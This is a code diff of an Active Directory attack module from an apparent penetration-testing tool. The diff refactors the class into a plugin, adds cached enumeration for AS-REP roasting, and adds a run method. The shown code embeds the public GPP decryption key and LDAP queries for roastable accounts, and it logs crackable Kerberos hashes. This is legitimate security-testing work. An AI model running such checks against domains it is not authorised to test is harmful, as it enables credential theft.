@@ -1,5 +1,6 @@
 from ldap3 import Server, Connection, ALL, NTLM
 from core.logger import log
+from core.module import RedReasonModule
 import datetime
 import os
 
@@ -22,13 +23,18 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 # GPP Key
 GPP_KEY = unhexlify('4e9906e8fcb66cc9faf49310620fe8682ed387d130f429438e9e2448007d136e')
 
-class ADAttacker:
-    def __init__(self, target, domain, user, password, hashes=None):
+
+class ADAttacker(RedReasonModule):
+    def __init__(self, target, domain, user, password, hashes=None, enumeration_data=None):
+        super().__init__()
+        self.name = "ADAttacker"
+        self.description = "Active Directory Attack & Validation Module"
         self.target = target
         self.domain = domain
         self.user = user
         self.password = password
         self.hashes = hashes
+        self.enumeration_data = enumeration_data # Shared state (users, computers)
         self.conn = None
         
         # Parse hashes
@@ -71,14 +77,29 @@ class ADAttacker:
 
     def check_asrep_roasting(self):
         log.info("Checking for AS-REP Roasting vulnerable accounts...")
-        # filter: userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH)
-        search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
-        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName', 'distinguishedName'])
         
-        found = False
-        for entry in self.conn.entries:
-            found = True
-            username = str(entry.sAMAccountName)
+        targets = []
+        
+        # 1. Check Shared State (Noise Reduction)
+        if self.enumeration_data and hasattr(self.enumeration_data, 'collected_users'):
+            log.info("Using cached enumeration data for AS-REP Roasting...")
+            for user in self.enumeration_data.collected_users:
+                if user.is_roastable_asrep:
+                    targets.append(user.name)
+        else:
+            # 2. Fallback to LDAP Search
+            log.info("No cache found, querying LDAP...")
+            # filter: userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH)
+            search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
+            for entry in self.conn.entries:
+                targets.append(str(entry.sAMAccountName))
+        
+        if not targets:
+            log.info("No AS-REP Roastable accounts found.")
+            return
+
+        for username in targets:
             log.success(f"VULNERABLE: AS-REP Roastable account found: {username}")
             log.evidence("User has 'Do not require Kerberos preauthentication' set.")
             
@@ -93,9 +114,6 @@ class ADAttacker:
                 log.hypothesis(f"Hash can be cracked: {hash_line[:30]}...") 
             else:
                  log.fail(f"Could not retrieve TGT for {username} (unexpected)")
-
-        if not found:
-            log.info("No AS-REP Roastable accounts found.")
 
     def check_kerberoasting(self):
         log.info("Checking for Kerberoasting capable accounts...")
@@ -351,6 +369,11 @@ class ADAttacker:
 
             except Exception as e:
                  log.debug(f"PetitPotam check failed on {target}: {e}")
+
+    def run(self, args=None):
+        self.log_start()
+        self.run_all()
+        self.log_end()
 
     def run_all(self):
         if self.connect():
